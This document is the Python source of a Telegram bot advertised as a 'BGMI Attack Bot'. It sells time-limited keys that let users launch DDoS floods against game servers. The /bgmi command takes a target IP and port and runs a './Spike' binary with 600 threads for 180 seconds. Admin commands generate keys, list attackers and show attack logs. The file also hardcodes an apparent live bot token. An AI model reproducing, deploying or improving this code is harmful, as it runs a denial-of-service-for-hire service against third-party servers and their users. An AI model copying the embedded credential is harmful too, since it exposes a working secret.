from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess
import threading
import random
import string
import time
import asyncio
from datetime import datetime
import pytz

# Global variables
attack_running = False
authorized_users = {}  # {user_id: {"expiry_time": expiry_time, "key": key, "redeem_time": redeem_time, "attacks": attack_count}}
keys = {}  # {key: expiry_time}
attack_logs = []  # List to store attack logs
all_users = set()  # Track all users who have interacted with the bot
# Global variable to store users who tried to start an attack while one was already running
waiting_users = set()

# Define admin ID
ADMIN_ID = 7163028849  # Replace with your admin's Telegram ID

# Define default values
DEFAULT_PACKET_SIZE = 12
DEFAULT_THREADS = 600
MAX_ATTACK_TIME = 180  # in seconds

# Kolkata timezone
KOLKATA_TZ = pytz.timezone('Asia/Kolkata')

async def get_user_info(user_id, context):
    """Fetch user details (Username, First Name, Last Name) given a User ID."""
    try:
        user_info = await context.bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else "No Username"
        first_name = user_info.first_name if user_info.first_name else "No First Name"
        last_name = user_info.last_name if user_info.last_name else "No Last Name"
    except Exception as e:
        print(f"Failed to fetch user info for {user_id}: {e}")
        username, first_name, last_name = "Unknown", "Unknown", "Unknown"
    
    return f"👤 **User ID:** `{user_id}`\n🔹 **Username:** {username}\n📝 **Name:** {first_name} {last_name}"

# Function to generate random keys
def generate_key(duration):
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    keys[key] = time.time() + duration
    return key

# Parse duration strings (e.g., "1hour", "2days")
def parse_duration(duration_str):
    if 'hour' in duration_str:
        return int(duration_str.replace('hour', '')) * 3600
    elif 'day' in duration_str:
        return int(duration_str.replace('day', '')) * 86400
    return None

# Function to run the attack
def attack(ip, port, context, chat_id, user_id):
    global attack_running

    try:
        # Run the attack command in a non-blocking way
        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])

        # Log the attack in Kolkata timezone
        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        attack_logs.append({
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "time": attack_time
        })

        # Increment attack count for the user
        if user_id in authorized_users:
            authorized_users[user_id]["attacks"] += 1

    finally:
        # Ensure the attack_running flag is reset even if an error occurs
        attack_running = False

# Command: Start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    all_users.add(user_id)  # Add user to the all_users set

    start_message = (
        "🚀 *Welcome to BGMI Attack Bot* 🚀\n\n"
        "⚡️ _A powerful tool to manage DDoS attacks for BGMI/PUBG servers_ ⚡️\n\n"
        "✨ **Key Features:**\n"
        "   • Start attacks with `/bgmi` command\n"
        "   • Key-based authorization system\n"
        "   • Admin controls for key generation\n"
        "   • Real-time attack monitoring\n\n"
        "🔧 **Commands:**\n"
        "   /help - Show all commands\n"
        "   /bgmi - Start attack\n"
        "   /redeem - Activate your key\n\n"
        "👑 **Bot Owner:** [TITAN OP](https://t.me/TITANOP24)\n"
        "⚙️ _Use this bot responsibly!_"
    )
    await update.message.reply_text(start_message, parse_mode="Markdown")

# Command: Show help
async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_message = (
        "🛠️ *Available Commands* 🛠️\n\n"
        "🎮 *Attack Commands:*\n"
        "`/bgmi <ip> <port>` - Start a new attack\n"
        "`/redeem <key>` - Redeem your access key\n\n"
        "🔑 *Admin Commands:*\n"
        "`/genkey <duration>` - Generate single key\n"
        "`/mgenkey <duration> <amount>` - Bulk generate keys\n"
        "`/users` - List authorized users\n"
        "`/logs` - Show attack logs\n"
        "`/broadcast <message>` - Broadcast message to all users\n\n"
        "ℹ️ *Info Commands:*\n"
        "`/start` - Show bot introduction\n"
        "`/help` - Display this message\n\n"
        "👨💻 *Developer:* [@TITANOP24](https://t.me/TITANOP24)\n"
        "🔒 _All attacks are logged and monitored_"
    )
    await update.message.reply_text(help_message, parse_mode="Markdown")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /bgmi command while ensuring only one attack runs at a time."""
    global attack_running
    user_id = update.message.from_user.id

    # If an attack is already running, notify the user and add them to the waiting list
    if attack_running:
        waiting_users.add(user_id)
        await update.message.reply_text('⏳ Another attack is running. Please wait for it to finish.')
        return

    # Check if user is authorized
    if user_id not in authorized_users or time.time() > authorized_users[user_id]["expiry_time"]:
        await update.message.reply_text('❌ You are not authorized. Redeem a key first.')
        return

    # Validate command arguments
    if len(context.args) < 2:
        await update.message.reply_text('Usage: /bgmi <ip> <port>')
        return

    ip, port = context.args[0], context.args[1]

    # Start the attack
    attack_running = True
    attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")

    # Notify about attack start
    attack_details = (
        f"🚀 Attack started!\n\n"
        f"🎯 Target IP: `{ip}`\n"
        f"🚪 Port: `{port}`\n"
        f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
        f"📅 Time: `{attack_time}`"
    )
    await update.message.reply_text(attack_details, parse_mode="Markdown")

    # Run attack asynchronously and pass context
    asyncio.create_task(run_attack(ip, port, user_id, context))

async def run_attack(ip, port, user_id, context):
    """Runs attack asynchronously and notifies waiting users when finished."""
    global attack_running, waiting_users

    try:
        # Start attack process
        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])

        # Log attack
        attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        attack_logs.append({
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "time": attack_time
        })

        # Increment user's attack count
        if user_id in authorized_users:
            authorized_users[user_id]["attacks"] += 1

        # Wait asynchronously
        await asyncio.sleep(MAX_ATTACK_TIME)

    finally:
        # Reset attack flag
        attack_running = False

        # Notify the original user
        attack_finished_message = (
            f"✅ Attack finished!\n\n"
            f"🎯 Target IP: `{ip}`\n"
            f"🚪 Port: `{port}`\n"
            f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
            f"📅 Time: `{datetime.now(KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        await context.bot.send_message(chat_id=user_id, text=attack_finished_message, parse_mode="Markdown")

        # Notify users who were waiting
        if waiting_users:
            for user in waiting_users:
                try:
                    await context.bot.send_message(chat_id=user, text="🔔 The previous attack has finished. You can now start your attack!")
                except Exception as e:
                    print(f"Failed to notify user {user}: {e}")

            # Clear waiting list
            waiting_users.clear()


# Command: Generate a key (Admin only)
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /genkey <duration>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    key = generate_key(duration)
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺:\n\n`{key}`', parse_mode="Markdown")

# Command: Generate multiple keys (Admin only)
async def mgenkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘵 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥.')
        return

    if len(context.args) < 2:
        await update.message.reply_text('Usage: /mgenkey <duration> <number>')
        return

    duration = parse_duration(context.args[0])
    if not duration:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘥𝘶𝘳𝘢𝘵𝘪𝘰𝘯. 𝘜𝘴𝘦 𝘧𝘰𝘳𝘮𝘢𝘵 𝘭𝘪𝘬𝘦 1𝘩𝘰𝘶𝘳, 2𝘥𝘢𝘺𝘴, 𝘦𝘵𝘤.')
        return

    number = int(context.args[1])
    keys_list = [generate_key(duration) for _ in range(number)]
    await update.message.reply_text(f'🔑 𝘎𝘦𝘯𝘦𝘳𝘢𝘵𝘦𝘥 𝘬𝘦𝘺𝘴:\n\n' + '\n'.join([f'`{key}`' for key in keys_list]), parse_mode="Markdown")

# Command: Block a specific key (Admin only)
async def block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Blocks a key and revokes access from users who redeemed it, showing full user details."""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /block <key>')
        return

    key_to_block = context.args[0]

    # Remove key from keys (if exists)
    if key_to_block in keys:
        del keys[key_to_block]

    # Find users who redeemed this key and revoke their access
    revoked_users = []
    for user_id, details in list(authorized_users.items()):
        if details["key"] == key_to_block:
            del authorized_users[user_id]  # Remove user access
            
            # Fetch user details
            user_details = await get_user_info(user_id, context)
            revoked_users.append(user_details)

    # Response message
    if revoked_users:
        await update.message.reply_text(
            f"🚫 **Key `{key_to_block}` has been blocked and access revoked for:**\n\n" + '\n\n'.join(revoked_users),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(f"✅ Key `{key_to_block}` has been blocked (No active users were using it).", parse_mode="Markdown")


# Command: List authorized users (Admin only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lists all authorized users along with their user details."""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return

    users_list = []
    for user_id, details in authorized_users.items():
        user_info = await get_user_info(user_id, context)
        redeem_time = datetime.fromtimestamp(details["redeem_time"], KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        expiry_time = datetime.fromtimestamp(details["expiry_time"], KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
        
        users_list.append(
            f"{user_info}\n"
            f"🔑 **Key:** `{details['key']}`\n"
            f"⏰ **Redeem Time:** `{redeem_time}`\n"
            f"⏳ **Expiry Time:** `{expiry_time}`\n"
            f"🎯 **Attacks Done:** `{details['attacks']}`"
        )

    await update.message.reply_text('📜 **Authorized Users:**\n\n' + '\n\n'.join(users_list), parse_mode="Markdown")

# Command: Redeem a key
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text('Usage: /redeem <key>')
        return

    key = context.args[0]
    if key not in keys or time.time() > keys[key]:
        await update.message.reply_text('❌ 𝘐𝘯𝘷𝘢𝘭𝘪𝘥 𝘰𝘳 𝘦𝘹𝘱𝘪𝘳𝘦𝘥 𝘬𝘦𝘺.')
        return

    authorized_users[update.message.from_user.id] = {
        "expiry_time": keys[key],
        "key": key,
        "redeem_time": time.time(),
        "attacks": 0
    }
    del keys[key]
    await update.message.reply_text('✅ 𝘒𝘦𝘺 𝘳𝘦𝘥𝘦𝘦𝘮𝘦𝘥. 𝘠𝘰𝘶 𝘢𝘳𝘦 𝘯𝘰𝘸 𝘢𝘶𝘵𝘩𝘰𝘳𝘪𝘻𝘦𝘥 𝘵𝘰 𝘶𝘴𝘦 /𝘣𝘨𝘮𝘪.')

# Command: Show attack logs (Admin only)
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows attack logs with full user details."""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return

    logs_list = []
    for log in attack_logs:
        user_info = await get_user_info(log["user_id"], context)
        
        logs_list.append(
            f"{user_info}\n"
            f"🎯 **Target IP:** `{log['ip']}`\n"
            f"🚪 **Port:** `{log['port']}`\n"
            f"⏰ **Time:** `{log['time']}`"
        )

    await update.message.reply_text('📜 **Attack Logs:**\n\n' + '\n\n'.join(logs_list), parse_mode="Markdown")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcasts a message to all users (authorized and non-authorized)."""
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('❌ You are not authorized to use this command.')
        return

    if len(context.args) < 1:
        await update.message.reply_text('Usage: /broadcast <message>')
        return

    message = ' '.join(context.args)

    # Collect all users (both authorized & all previous users)
    all_recipients = set(all_users) | set(authorized_users.keys())  # Merge both sets

    # Send the message to each user
    sent_count = 0
    for user_id in all_recipients:
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 Broadcast:\n\n{message}")
            sent_count += 1
        except Exception as e:
            print(f"Failed to send broadcast to user {user_id}: {e}")

    # Confirm broadcast completion
    await update.message.reply_text(f'✅ Message broadcasted to {sent_count} users.')


# Main function to start the bot
def main():
    # Create the Application
    application = Application.builder().token("7828525928:AAGZIUO4QnLsD_ITKGSkfN5NlGP3UZvU1OM").build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("bgmi", bgmi))  # bgmi is now defined
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("mgenkey", mgenkey))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("block", block))  # Add the block command
    application.add_handler(CommandHandler("broadcast", broadcast))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    asyncio.run(main())
